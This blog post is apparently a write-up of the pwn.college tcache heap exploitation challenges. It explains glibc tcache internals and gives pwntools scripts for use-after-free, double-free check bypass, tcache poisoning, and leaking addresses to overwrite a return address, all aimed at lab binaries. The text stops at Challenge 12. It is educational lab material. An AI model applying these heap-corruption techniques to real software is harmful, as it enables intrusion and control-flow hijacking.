---
layout: post
title:  "Pwn College - Tcache Exploitation"
date:   2024-05-20 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Overview

Over the years, there were many heap exploitation techniques developed. Most of them can be found [here][heap-techniques] (there are other obscure techniques, not mentioned there). \
This module deals with a subset of techniques, only involving the tcache. 

## Background

One approach of dynamically allocating memory is `mmap`. While it does allows dynamic allocation and deallocation for regions that surivves across functions (unlike the stack), the allocation size is inflexible, and requires kernel involvment for every call. \
A smarter solution is to write a library, that allocates a large chunk of memory (`brk`, not `mmap`, but also allocates large amout of memory), and manage the small chunks of it, based on demand. 

Current dynamic allocator of Linux usermode is `ptmalloc2`, for its kernel - `kmalloc` (slab allocator), for FreeBSD it is `jemalloc` (which used in Android), for Windows - `Segment Heap, NT Heap`, for Chrome - `PartitionAlloc`. 

It is good to mention that the heap **HAVE NO RELATION** to the heap data structure. \
The heap provides the basic API of `malloc, free`, as well as more fancy stuff, such as `realloc, calloc` and others (`aligned_alloc`). 

Recall `ptmalloc` doesn't uses `mmap` but `brk`. \
`brk(addr)` expands the end of the data segment up to `addr`, while `sbrk(NULL)` returns the end, and `sbrk(delta)` increments the end by `delta` bytes. `ptmalloc` simply slices bytes off the data segment for small allocations, and uses `mmap` for very large allocations.

### Detection

We can detect some dynamic memory issues via `valgrind`. Also, glibc itself has some hardening techniques, in the cost of performance - `MALLOC_CHECK`, `MALLOC_PERTURB`, `MALLOC_MMAP_THRESHOLD` (making ALL allocations being done via `mmap`, lol). 

### Tcache

Thread Local Caching - feature of `ptmalloc` (and other popular allocators), to speed up repeated small allocations within a single thread. \
Implemented as singly-linked list. 
Notice there are separate tcache bins (linked lists) for every chunk sizes (by multiple of the alignment `0x10`). \
In each thread, theres one instance of `struct tcache_perthread_struct`, which tracks all various tcache bins heads (`tcache_entry *`), as well as the count of available chunks per bin. This is a readonly area. For fast accessing, this instance address resides at the second qword of data within every freed chunk (instead of `bk`). 

```c
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

typedef struct tcache_entry
{
    struct tcache_entry *next;
    struct tcache_perthread_struct *key;
} tcache_entry;
```

The last chunk within every bin (first freed chunk) contains its `next` set to `NULL`. \
Recall all allocated chunks contains metadata before them, of `0x10` bytes long (on 64-bit platforms). Moreover, allocations are always aligned to `0x10`. Hence, if we would allocate `0x1c` bytes (28 bytes), we would actually allocate chunk of size `align(0x2c,10) = 0x30` bytes. \
The chunk metadata contains its `size` and  `prev_size`, as well as `flags` (`PREV_INUSE, IS_MMAPPED, NON_MAIN_ARENA`). Notice `flags` are actually the lowest nibble within `size`, as the memory is aligned to `0x10`. An important bit is `PREV_INUSE`, which tracks whether or not the previous chunk is used (allocated). Its main usage is within consolidation of chunks, and **irrelevant** for tcache, which completely ignores this value. \
When chunk is freed, the `next` pointer is being updated to the previously head chunk. `next` is actually part of the data of a chunk, as it is now being un-used. For tcache, when something is freed, it is pushed to the HEAD of the list. 

Upon freeing, the right bin index is fetch based on the chunk size (which is part of the metadata). It checks for a double free, by naively inspecting the `key` offset of the chunk, and asserting it isn't equal to `tcache_perthread_struct` address. \
It then pushes the freed allocation as the head of the list, and updates `tache_perthread_struct`.  

For allocation, we simply calculate the correct bin index, checking the `tache_perthread_struct` count of that bin, and fetching the head of the bin. \
Notice that allocation does not clears all sensitive pointers (only `key`..), as well as doesn't verifies if the `next` address of the previously-head chunk makes sense. 

#### Double Free

In order to address double free, the `key` mitigation was added. The relevant error message of the check is `"double free detected in tcache 2"`, and the check being made is simply compare of `e->key == tcache` (if it holds, it means double free occured). \
Notice it handles the case of a coincidence, where the user data simply had the `tcache_perthread_struct` as its second qword data (it does so by traversing all chunks of that bin. If the chunk to be freed isn't there, it assumes it really is allocated). \
If we can write to the freed chunk, by simply overwriting the second qword to **any** other value that is not `tcache` value, we would be able to pass this check and perform another free! \
The double free gives us a strong primitive, where we can have multiple object instances pointing to the same underlying chunk (as 2 malloc calls would return the same address).

#### Tcache Poisoning

Corrupting `tcache_entry->next`. This means `malloc` would return address of our wish, upon allocation. Hence, a chunk to arbitrary address. \
This may be very usefull primitive to leverage towards arbitrary R/W. 

## Challenge 1

I've set `pwndbg` environment for all challenges from now on. Its heap commands documentation can be found [here][pwndbg-docs].

Upon launching the challenge, the heap is in the following state:

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x556060c7c000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x556060c7c290
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x556060c7c2b0
Size: 0x20d50 (with flag bits: 0x20d51)

pwndbg> bins
tcachebins
empty
fastbins
empty
unsortedbin
empty
smallbins
empty
largebins
empty

pwndbg> tcache
tcache is pointing to: 0x556060c7c010 for thread 1
{
  counts = {0 <repeats 64 times>},
  entries = {0x0 <repeats 64 times>}
}
```

Other useful commands may be `vis_heap_chunks` and `malloc_chunk`. 

Upon allocating the flag buffer via `read_flag`, it is being allocated off the `top_chunk` (can be seen via `heap`). Of course, the bins resides empty as this chunk isn't freed. 

We can exploit this challenge by creating a UAF - making the flag allocation to be performed off the tcache of size `0x250`, then calling `puts` on the freed slot:

```python
def malloc(p, size):
    p.sendline(b'malloc')
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'quit): ')

def free(p):
    p.sendline(b'free')
    p.recvuntil(b'quit): ')

def exploit():    
    p = process(BINARY)
    p.recvuntil(b'quit): ')
    
    size = 574
    malloc(p, size)
    free(p)
    p.sendline(b'read_flag')
    p.sendline(b'puts')
    
    p.interactive()
```

## Challenge 2

Now the allocation size is actually being randomized. \
My idea is to simply try all possible chunks allocation sizes, re-allocating the flag after each of them (so it would hopefully be allocated within the candidate bin) and try to leak the flag via `puts`.

```python
def read_flag(p):
    p.sendline(b'read_flag')
    p.recvuntil(b'quit): ')

def puts_flag(p):
    p.sendline(b'puts')
    output = p.recvuntil(b'quit): ')
    if b'pwn.college' in output:
        print(f'OUTPUT:{output}')
        exit(0)

def exploit():    
    p = process(BINARY)
    p.recvuntil(b'quit): ')
    
    for size in range(0x10, 0x800, 0x10):
        print(f'Trying size:{size}')
        malloc(p, size)
        free(p)
        read_flag(p)
        puts_flag(p)
        
    p.interactive()
```

## Challenge 3

Now the flag buffer is actually being allocated twice before it is written. Hence, we'd like our target bin to contain 2 available chunks. 

```python
def malloc(p, index, size):
    p.sendline(b'malloc')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'quit): ')

def free(p, index):
    p.sendline(b'free')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'quit): ')

def read_flag(p):
    p.sendline(b'read_flag')
    p.recvuntil(b'quit): ')

def puts_flag(p, index):
    p.sendline(b'puts')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    output = p.recvuntil(b'quit): ')
    if b'pwn.college' in output:
        print(f'OUTPUT:{output}')
        exit(0)

def exploit():    
    debug = False
    p = process(BINARY)
    p.recvuntil(b'quit): ')
    
    for size in range(0x10, 0x800, 0x10):
        print(f'Trying size:{size}')
        malloc(p, 0, size)
        malloc(p, 1, size)
        free(p, 0)
        free(p, 1)
        read_flag(p)
        puts_flag(p, 0)
        
    p.interactive()
```

## Challenge 4

This challenge can manage only up to 1 unique allocations. However, flag is being allcoated 2 times before it is used. \
This means we would like to populate its bin with 2 chunks. We can do so by exploiting double free on that chunk, which only requires writing SOMETHING to `tcache_entry.key`. 

```python
def scanf(p, buf):
    p.sendline(b'scanf')
    p.sendline(buf)
    p.recvuntil(b'quit): ')

def exploit():    
    debug = False
    p = process(BINARY)
    p.recvuntil(b'quit): ')
    
    buf = b'A' * 8 + b'B'
    for size in range(0x10, 0x800, 0x10):
        print(f'Trying size:{size}')
        malloc(p, size)
        free(p)
        scanf(p, buf)
        free(p)
        read_flag(p)
        puts_flag(p)
        
    p.interactive()
```

Notice I've used linear heap overflow to the freed chunk, which overwrote both `next` and `key`. In that case, `next` was overwritten to `0x4141414141414141` and `key` LSB to `0x42` (and `0x0a` due newline..). \
The most interesting finding within this challenge, is the fact that upon triggering the second free, it actually "fixes" the overwritten `next` pointer is restored:

Before double free:

```bash
0x557495a182b0  0x0000000000000000      0x00000000000003b1      ................                                                                                                                                                                                   
0x557495a182c0  0x4141414141414141      0x0000557495a10042      AAAAAAAAB...tU..         <-- tcachebins[0x3b0][0/1]
```

After: 

```bash
0x557495a182b0  0x0000000000000000      0x00000000000003b1      ................
0x557495a182c0  0x0000557495a182c0      0x0000557495a18010      ....tU......tU..         <-- tcachebins[0x3b0][0/2], tcachebins[0x3b0][0/2]
```

## Challenge 5

This challenge is interesting. After allocating the flag buffer, it sets its chunk `next` pointer to `NULL`. In order to print the flag, a check is being performed on the flag buffer, checking its `next` is NOT a `NULL`. 
This means we should actually free the flag buffer, which in the case of a non-empty bin, would set its `next` pointer. 

But how can we free the flag buffer without any leak? 
The idea is simple - first, allocate chunk of the known flag chunk size - `1000`. Then free it, and allocate the flag chunk. This would make the flag address resides within `slot[0]`. Then, when the flag is allocated, allocate another chunk of size `1000` at `slot[1]` and free it, making sure the flag's bin isn't empty. 
Now, when we would free `slot[0]`, it would set the flag's `next` pointer to `slot[1]` chunk's value.

This is pretty cool. This challenge demonstrates how we can manipulate a chunk, without any UAF vuln. The only vuln used here, is the fact that the slot heap addresses aren't being nullified upon a `free`. 

```python
size = 1000
malloc(p, 0, size)
free(p, 0)
read_flag(p)  # Now flag address is stored within slot[0]

malloc(p, 1, size)
free(p, 1)  # The bin corresponding to flag size isn't empty

free(p, 0)  # free the flag chunk, now setting its 'next' ponter to slot[1] value. 
        
puts_flag(p)
```

## Challenge 6

We want to obtain read primitive. \
My plan is to corrupt a free chunk's `next` pointer. That way, whenever we would allocate twice off that bin, we should have a chunk allocated to the goal address. From there, a simple `puts` of the chunk would give us the secret value.

```python
def exploit():
    p = process(BINARY)
    secret_addr = get_leak_addr(p)
    print(f'secret_addr: {hex(secret_addr)}')

    buf = struct.pack('<Q', secret_addr)
    # for size in range(0x10, 0x800, 0x10):
    size = 0x80
    print(f'Trying size:{size}')
    malloc(p, 0, size)
    malloc(p, 1, size)
    free(p, 1)
    free(p, 0)  # Now slot[0] chunk's next is pointing to slot[1]
    scanf(p, 0, buf)  # Overwrite its next pointer to our secret
    malloc(p, 2, size)  # Allocate slot[0], now the head of the freelist points to the secret
    malloc(p, 3, size)  # Now the chunk is allocated on the secret, which address is stored on slot 3!
    data = puts(p, 3)
    print(f'got data: {data}')
    send_flag(p, data)
        
    p.interactive()
```

## Challenge 7

Similar to before, but this time the secret value is 16 bytes long. \
At a first glance, the solution should be identical. However, notice that upon allocation, the allocator nullifies the `tcache_perthread_struct` member, hence the second qword. \
We can still bypass this if we would leak 8 bytes at a time, from the end of the secret. 

A simpler approach is to overwrite the whole secret, as it is completely controlled by the allocated chunk.

```python
def allocate_chunk_at_addr(p, addr):
    buf = struct.pack('<Q', addr)
    size = 0x80
    malloc(p, 0, size)
    malloc(p, 1, size)
    free(p, 1)
    free(p, 0)  # Now slot[0] chunk's next is pointing to slot[1]
    scanf(p, 0, buf)  # Overwrite its next pointer to our secret
    malloc(p, 2, size)  # Allocate slot[0], now the head of the freelist points to the secret
    malloc(p, 3, size)  # Now the chunk is allocated on the secret, which address is stored on slot 3!
    data = puts(p, 3)
    print(f'addr[0]: {data}')  # Leaks first 8 bytes

    return data

def exploit():
    p = process(BINARY)
    secret_addr = 0x426966
    print(f'secret_addr: {hex(secret_addr)}')

    allocate_chunk_at_addr(p, secret_addr)
    my_secret = b'A' * 16
    scanf(p, 3, my_secret)  # Corrupt secret with known value
    send_flag(p, my_secret)

    p.interactive()
```

## Challenge 8

Similar to before, but now the address contains whitespaces within its LSB. Hence, we won't be able to pass it via `scanf`. \
My idea is to pass another address right before it, which doesn't contains any whitespace characters. 

```python
def exploit():
    orig_secret_addr = 0x42ce0a
    pad = 2
    secret_addr = orig_secret_addr - pad
    print(f'secret_addr: {hex(secret_addr)}')

    allocate_chunk_at_addr(p, secret_addr)

    my_secret = b'A' * (pad + 16)
    scanf(p, 3, my_secret)  # Corrupt secret with known value
    send_flag(p, my_secret)

    p.interactive()
```

## Challenge 9

Now we cannot make near allocations (`0x10000` bytes) to the goal secret. \
Recall we can still create a chunk that contains within its `next` our goal buffer. 

My original idea is to somehow utilize the fact that upon a `malloc` call, the `key` parameter is being nulled out. Moreover, notice the wierd ordering that happens while performing the boundary check: it first does the `malloc`, and if boundary check failed - report the error and nullifies the right slot. Anyways, it DOES performs the allocation!
This means we can clear the secret this way. 

```python
def exploit():
    p = process(BINARY)
    secret_addr = 0x424b3e
    pad = 0
    print(f'secret_addr: {hex(secret_addr)} pad: {hex(pad)}')
    # Utilize the fact that allocations nullifies the 'key' member, hence clear the whole flag
    allocate_chunk_at_addr(p, secret_addr - 8)
    allocate_chunk_at_addr(p, secret_addr)
    my_secret = b'\x00' * 16
    send_flag(p, my_secret)
    p.interactive()
```

## Challenge 10

Redirect control flow by overwritign main's ra. 

```python
def exploit():
    p = process(BINARY)
    main_ra = get_leak_addr(p) + 280
    pie_base = get_leak_addr(p) - p.elf.symbols['main']
    assert(pie_base & 0xfff == 0)
    win_addr = pie_base + p.elf.symbols['win']
    print(f'main_ra: {hex(main_ra)} win_addr: {hex(win_addr)}')

    # Utilize the fact that allocations nullifies the 'key' member, hence clear the whole flag
    allocate_chunk_at_addr(p, main_ra)
    buf = struct.pack('<Q', win_addr)
    scanf(p, 3, buf)
    p.sendline(b'quit')
```

## Challenge 11

Now the binary is full-mitigated, and there are no leaks. However, we have the option to call `echo` on a pointer and an offset within a slot. Under the hood, it spawns a child process, execs `/usr/bin/echo`, and sends the desired address as `argv[2]`. \
If we get a `libc` leak, we can simply get a stack leak too, as all it requires is to leak `environ`. From the stack, it should be pretty trivial to leak the program's base. \
Obtaining a heap leak is trivial using the `next` pointer. My idea is to scan the heap for any other region pointers, such as `libc, stack` or `program`.

For this exact reason, pwndbg contains the awesome tool `p2p` - which searches pointer to pointer chains. Given a mapping, it searches for all pointers that point to a specified mapping. Notice we can state program / libc as simply writing the mapped file:

```bash
pwndbg> p2p heap /challenge/babyheap_level11.0
00:0000│  0x563c523c0ce8 (__init_array_start) —▸ 0x563c523bd4e0 (frame_dummy) ◂— endbr64 
00:0000│  0x563c523c0cf0 (__init_array_start+8) —▸ 0x563c523bd500 (get_heap_location) ◂— endbr64 
00:0000│  0x563c523c0cf8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x563c523bd4a0 (__do_global_dtors_aux) ◂— endbr64 
00:0000│  0x563c523c0d78 (_DYNAMIC+120) —▸ 0x563c523bc3a0 ◂— 0x1f00000003
00:0000│  0x563c523c0d88 (_DYNAMIC+136) —▸ 0x563c523bc700 ◂— 0x6f732e6362696c00
00:0000│  0x563c523c0d98 (_DYNAMIC+152) —▸ 0x563c523bc3d0 ◂— 0
00:0000│  0x563c523c0dd8 (_DYNAMIC+216) —▸ 0x563c523c0ef0 (_GLOBAL_OFFSET_TABLE_) ◂— 0x4d00
00:0000│  0x563c523c0e08 (_DYNAMIC+264) —▸ 0x563c523bca00 ◂— 0x4f08
00:0000│  0x563c523c0e18 (_DYNAMIC+280) —▸ 0x563c523bc8f8 ◂— 0x4ce8
00:0000│  0x563c523c0e88 (_DYNAMIC+392) —▸ 0x563c523bc872 ◂— 0x2000200020000
00:0000│  0x563c523c1008 (__dso_handle) ◂— 0x563c523c1008 (__dso_handle)
```

However, this feature seems abit buggy - as it actually parsed the program's addresses space, not the heap. \
Other tools, (that are now actually documented and should work) are `probeleak` and `leakfind`. 

```bash
pwndbg> probeleak 0x563c523e7000 0x21000
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
0x000c8: 0x0000563c523e7350 = (rw-p) [heap] + 0x350
0x00358: 0x0000563c523e7010 = (rw-p) [heap] + 0x10
```

The printings were blue, meaning the found pointers were all heap pointers. 

At this point I think there's something I'm missing within the `echo` handler. Recall its implementation - it uses 6-byte array to store the `"Data:"` string, and right after them, stores the stack canary. By looking at the decomiled code, it seems to be calling `strcpy` to copy the string into the stack. However, by inspecting the assembly, there are only `mov` operations being made. \
This argument is used as `argv[1]`, where our `ptr + offset` are used as `argv[2]`. Moreover, notice that this handler actually uses a call for `malloc(0x20)` for the `argv` buffer. This actually gives us an arbitrary write primitive:

```c
argv = (char **)malloc(0x20);
*argv = "/bin/echo";
argv[1] = (char *)v4;
argv[2] = (char *)(ptr + offset);
```

Because we can fully control `argv` address returned by this malloc, and we control `ptr + offset`, we can basically write to anywhere we want, but we still have no leaks. \
A trick we can do, is to utilize the fact that `v4`, which is a stack address, is being written to the returned buffer. This means we can leak a stack address, by making sure the `argv` chuck is reused by one of our notes. 
This is pretty cool - the only vuln here, is the fact that the chunk's pointer within the slot isn't being nullified. Moreover, notice the first qword of the returned chunk is actually loaded with `"/bin/echo"` - which is part of the program's address space, hence yielding a PIE leakage. 

Because our final goal is having both stack and PIE leaks, we can perform the following:

1. `malloc` and `free` a chunk of `0x20`, within `slot[0]`. 

2. Call `echo` for `slot[0]` and `offset = 0`. Its `argv` would be allocated off the right tcache bin. Moreover, it would set the pointer to-be-read as `slot[0]`, which is `argv`. Hence, this would give us PIE program leak - the address of `"/bin/echo"`. 

3. Now we have two approaches. We can use the PIE program leak, in addition to overwriting the `next` ptr of chunks to addresses of our wish, in order to read pointers off the program. Then, we would call the `echo` handler for indices corresponding to the overwritten chunks. It would give us `libc` leakage (from GOT entries, for example). Having `libc` leak, we can repeat the process by reading its `environ` to obtain a stack leak. Notice this approach doesn't use the fact of `v4` overwrite at all, nor `offset`, hence probably not the intended solution (but much cooler). Another option is to use the fact that `echo` actually support printing with an offset. If we would repeat the exact process of 1+2, but provide `offset = 8`, we would obtain `v4` leak. Easy. 

Another thing we have to consider, is the fact that `win` has an `LSB` of `\x00`. In order to bypass the `scanf` call, I've simply jumped to `win + 4`. 

```python
def echo(p, index, offset):
    p.sendline(b'echo')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Offset: ')
    p.sendline(str(offset).encode())
    p.recvuntil(b'Data: ')
    data = p.readline()[:-1] + b'\x00' * 2
    assert(len(data) == 8)
    data = struct.unpack('<Q', data)[0]
    p.recvuntil(b'quit): ')

    return data

def exploit():
    p = process(BINARY)
    malloc(p, 0, 0x20)
    free(p, 0)
    bin_echo_offset = next(p.elf.search(b"/bin/echo"))
    pie_base = echo(p, 0, 0) - bin_echo_offset
    assert(pie_base & 0xfff == 0)
    win_addr = pie_base + p.elf.symbols['win']

    malloc(p, 0, 0x20)
    free(p, 0)
    main_ra = echo(p, 0, 8) + 374
    print(f'main_ra: {hex(main_ra)} win_addr: {hex(win_addr)}')

    allocate_chunk_at_addr(p, main_ra)
    buf = struct.pack('<Q', win_addr + 4)  # win_addr has LSB of 0. We have to jump somewhere near. 
    scanf(p, 3, buf)
    p.sendline(b'quit')

    p.interactive()
```

Notice that the exploit isn't 100% reliable. This is ok, as the reason behind this is `main_ra` and `win_addr` having some additional whitespace characters. 

## Challenge 12

This time, our goal is for `malloc` to return a stack pointer.




[heap-techniques]: https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/
[pwndbg-docs]: https://browserpwndbg.readthedocs.io/en/docs/commands/heap/heap/
